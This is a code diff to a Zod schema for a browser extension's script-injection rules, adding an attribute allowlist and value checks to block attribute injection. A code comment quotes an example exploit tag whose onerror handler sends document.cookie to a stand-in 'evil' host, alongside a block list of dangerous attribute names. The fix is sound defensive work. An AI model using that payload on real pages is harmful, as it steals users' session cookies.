@@ -89,9 +89,91 @@ export const DelayPairSchema = z.object({
   }).describe('Delay value in milliseconds (stringified number).'),
 }).describe('Delay rule pair: source and delay.');
 
+/**
+ * RQ-3024 (F-022) — attribute channel on injected <script> tags.
+ *
+ * The Requestly browser extension applies every name/value pair here as an HTML
+ * attribute on the script tag it injects into the page. With both fields as bare
+ * z.string(), the rendered tag could be
+ *   <script src="https://evil/x.js" onerror="fetch('https://evil/c?d='+document.cookie)">
+ * while scripts[].value stayed a benign comment. That matters because it defeats
+ * the obvious review: a human approving a rule at the confirmActivation prompt
+ * reads the script BODY, not the attribute list.
+ *
+ * Both halves of the channel are closed:
+ *   name  — allowlisted. An allowlist (not a denylist) means a future HTML
+ *           attribute with execution semantics is refused by default.
+ *   value — cannot contain the characters that break out of a quoted attribute.
+ *           Constraining only `name` would leave the identical bypass open via
+ *           value: name="data-x", value='" onerror="…' renders as
+ *           <script data-x="" onerror="…">.
+ *
+ * Comparison is trimmed and lowercased because HTML attribute names are
+ * case-insensitive — "SRC" and " OnError " are the same sink as "src"/"onerror".
+ */
+const SAFE_SCRIPT_ATTRIBUTE_NAMES = new Set([
+  'async',
+  'crossorigin',
+  'defer',
+  'integrity',
+  'nonce',
+  'referrerpolicy',
+  'type',
+]);
+
+/** `data-*` custom attributes carry no execution semantics. */
+const DATA_ATTRIBUTE_PATTERN = /^data-[a-z0-9]+(-[a-z0-9]+)*$/;
+
+/**
+ * Named explicitly so the refusal is self-documenting and testable, even though
+ * the allowlist above already excludes them.
+ */
+const FORBIDDEN_SCRIPT_ATTRIBUTE_NAMES = new Set([
+  'action',
+  'formaction',
+  'href',
+  'src',
+]);
+
+export const isSafeScriptAttributeName = (rawName: string): boolean => {
+  const name = rawName.trim().toLowerCase();
+  // Any event handler (onerror, onload, onanimationstart, …) is an execution sink.
+  if (/^on/.test(name)) {
+    return false;
+  }
+  if (FORBIDDEN_SCRIPT_ATTRIBUTE_NAMES.has(name)) {
+    return false;
+  }
+  return SAFE_SCRIPT_ATTRIBUTE_NAMES.has(name) || DATA_ATTRIBUTE_PATTERN.test(name);
+};
+
+/** Characters that terminate a quoted HTML attribute or open a new tag. */
+const ATTRIBUTE_BREAKOUT_CHARS = /["'<>`]/;
+
+export const isSafeScriptAttributeValue = (value: string): boolean =>
+  !ATTRIBUTE_BREAKOUT_CHARS.test(value);
+
 export const ScriptAttributeSchema = z.object({
-  name: z.string().describe('Attribute name (e.g. "data-tracker-id", "type", "defer").'),
-  value: z.string().describe('Attribute value.'),
+  name: z
+    .string()
+    .refine(isSafeScriptAttributeName, {
+      message:
+        'Unsupported script attribute name. Allowed: async, crossorigin, defer, integrity, ' +
+        'nonce, referrerpolicy, type, or data-*. Event handlers (on*) and src/href/action/' +
+        'formaction are rejected because they execute code or redirect the script source.',
+    })
+    .describe(
+      'Attribute name. Must be one of async, crossorigin, defer, integrity, nonce, ' +
+        'referrerpolicy, type, or a data-* attribute. on*/src/href/action/formaction are rejected.'
+    ),
+  value: z
+    .string()
+    .refine(isSafeScriptAttributeValue, {
+      message:
+        'Script attribute value must not contain quotes, angle brackets or backticks — ' +
+        'those characters can break out of the rendered attribute and inject a new one.',
+    })
+    .describe('Attribute value. Must not contain " \' < > or `.'),
 }).describe('Custom HTML attribute to add to the injected script tag.');
 
 export const ScriptModificationSchema = z.object({
